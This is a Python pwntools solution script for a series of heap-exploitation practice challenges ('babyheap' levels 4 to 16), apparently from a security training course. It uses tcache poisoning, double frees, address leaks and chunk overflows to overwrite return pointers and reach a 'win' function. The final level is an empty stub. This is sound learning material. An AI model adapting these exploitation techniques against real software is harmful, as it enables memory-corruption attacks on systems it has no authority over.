#!/usr/bin/python3
from pwn import *


def prepare(p):
    print(p.recvuntil('quit):'))

def malloc(p, size: str):
    prepare(p)
    p.sendline('malloc')
    p.sendline(size)

def malloc_id(p, chunk_id: bytes, size: bytes):
    prepare(p)
    p.sendline('malloc')
    p.sendline(chunk_id)
    p.sendline(size)

def send_flag(p, data: bytes):
    prepare(p)
    p.sendline('send_flag')
    p.sendline(data)

def free(p):
    prepare(p)
    p.sendline('free')

def free_id(p, chunk_id: bytes):
    prepare(p)
    p.sendline('free')
    p.sendline(chunk_id)

def scanf(p, content: bytes):
    prepare(p)
    p.sendline('scanf')
    p.sendline(content)

def scanf_id(p, content: bytes, chunk_id: bytes):
    prepare(p)
    p.sendline('scanf')
    p.sendline(chunk_id)
    p.sendline(content)

def echo_id(p, index, offset):
    prepare(p)
    p.sendline('echo')
    p.sendline(index)
    p.sendline(offset)

def read_id(p, index, length, content):
    prepare(p)
    p.sendline('read')
    p.sendline(index)
    p.sendline(length)
    p.sendline(content)

def stack_scanf(p, content):
    prepare(p)
    p.sendline('stack_scanf')
    p.sendline(content)

def stack_free(p):
    prepare(p)
    p.sendline('stack_free')

def get_addr(p):
    for _ in range(7):
        p.recvline()
    data = p.recvline()
    addr = int(data.split(b'|')[1].strip(), 16)
    return addr

def level4(p):
    malloc(p, b'20')
    free(p)
    malloc(p, b'372')
    free(p)
    addr = get_addr(p)
    scanf(p, p64(addr))
    malloc(p, b'16')
    scanf(p, b'A'*16 + p64(372))

def level6(p):
    secret = 0x420000 + 0x5e31

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

def level7(p):
    secret = 0x420000 + 0xb136

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

def level9(p):
    secret = 0x422a68 - 8

    malloc_id(p, b'0', b'16')
    malloc_id(p, '1', '16')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

    malloc_id(p, b'3', b'16')
    malloc_id(p, b'4', b'16')

    malloc_id(p, b'4', b'16')
    malloc_id(p, '5', '16')
    free_id(p, b'4') 
    free_id(p, b'5') 
    scanf_id(p, p64(secret+8), b'5')

    malloc_id(p, b'6', b'16')
    malloc_id(p, b'7', b'16')

    send_flag(p, b'\x00'*16)

def level10(p):
    for _ in range(5):
        data = p.recvline() # skip lame lines
    data = data.split(b' ')[10].strip()
    data = data[:len(data)-1]   # remove period
    stack_addr = int(data, 16)

    for _ in range(2):
        data = p.recvline()
    data = data.split(b' ')[7].strip()
    data = data[:len(data)-1]   # remove period
    main_addr = int(data, 16)

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(stack_addr+0x118), b'1')
    malloc_id(p, '2', '100')
    malloc_id(p, '3', '100')
    scanf_id(p, p64(main_addr-0xfd), b'3')

def level11(p):
    malloc_id(p, b'0', b'32')
    free_id(p, b'0')
    echo_id(p, b'0', b'0')
    echo_id(p, b'0', b'8') #get passed /bin/echo str
    for _ in range(4):
        data = p.recvline()

    data = data.split(b' ')[1].strip()
    stack_address = u64(data.ljust(8, b'\x00'))
    text_ptr = stack_address + 0x156
    ip = stack_address + 0x176

    malloc_id(p, b'0', b'16')
    malloc_id(p, b'1', b'16')
    free_id(p, b'0')
    free_id(p, b'1')
    scanf_id(p, p64(text_ptr), b'1')

    malloc_id(p, b'2', b'16')
    malloc_id(p, b'2', b'16')
    echo_id(p, b'2', b'1')
    for _ in range(4):
        data = p.recvline()
    data = data.split(b' ')[1].strip()
    text_addr = u64(data.ljust(7, b'\x00').rjust(8, b'\x00'))
    win_addr = text_addr + 0x100
    breakpoint()
    
    malloc_id(p, b'3', b'16')
    malloc_id(p, b'4', b'16')
    free_id(p, b'3')
    free_id(p, b'4')
    scanf_id(p, p64(ip), b'4')

    malloc_id(p, b'5', b'16')
    malloc_id(p, b'5', b'16')
    scanf_id(p, p64(win_addr), b'5')

def level12(p):
    malloc_id(p, b'0', b'112')
    free_id(p, b'0')
    stack_scanf(p, b'A'*0x30 + p64(0x50)*2)

def level13(p):
    for _ in range(4):
        data = p.recvline()
        print(data)
    stack_scanf(p, b'A'*56 + p64(0x100))
    stack_free(p)
    malloc_id(p, b'0', b'240')
    scanf_id(p, b'A'*180, b'0')

def level14(p):
    ''''''
    stack_scanf(p, b'A'*0x38 + p64(0x100))
    stack_free(p)
    malloc_id(p, b'0', b'240')
    echo_id(p, b'0', b'40')
    for _ in range(4):
        addr = p.recvline() 
    addr = addr.split(b' ')[1].strip()
    addr = u64(addr.ljust(8, b'\x00'))
    win = addr - 0x72f
    print(hex(win))
    echo_id(p, b'0', b'64')
    for _ in range(4):
        addr = p.recvline() 
    addr = addr.split(b' ')[1].strip()
    addr = u64(addr.ljust(8, b'\x00'))
    ret_ptr = addr - 0xe8
    print('addr: ', hex(ret_ptr))
    malloc_id(p, b'1', b'240')
    free_id(p, b'1')
    free_id(p, b'0')
    scanf_id(p, p64(ret_ptr), b'0')
    malloc_id(p, b'2', b'240')
    malloc_id(p, b'2', b'240')
    scanf_id(p, p64(win) ,b'2')

def level15(p):
    ''''''
    # Get win addr
    malloc_id(p, b'0', b'16')
    echo_id(p, b'0', b'0')
    echo_id(p, b'0', b'32')
    for _ in range(4):
        addr = p.recvline()
    addr = addr.split(b' ')[1].strip()
    addr = u64(addr.ljust(8, b'\x00'))
    win = addr - 0xd10

    # Get stack ret ptr
    echo_id(p, b'0', b'40')
    for _ in range(4):
        addr = p.recvline()
    addr = addr.split(b' ')[1].strip()
    addr = u64(addr.ljust(8, b'\x00'))
    ret_ptr = addr + 0x176

    # Create 3 chunks, do overflow to write addr
    malloc_id(p, b'0', b'16')
    malloc_id(p, b'1', b'16')
    malloc_id(p, b'2', b'16')
    free_id(p, b'2')
    free_id(p, b'1')
    read_id(p, b'0', b'40', b'A'*32 + p64(ret_ptr))
    malloc_id(p, b'3', b'16')
    malloc_id(p, b'3', b'16')
    read_id(p, b'3', b'8', p64(win))

def level16(p):
    ''''''
    

#p = process('/challenge/babyheap_level16.0')
p = process(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level16.0'])
#p = gdb.debug(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level16.0'], gdbscript= '''
#set follow-fork-mode parent
#c
#''')

level16(p)
p.interactive()
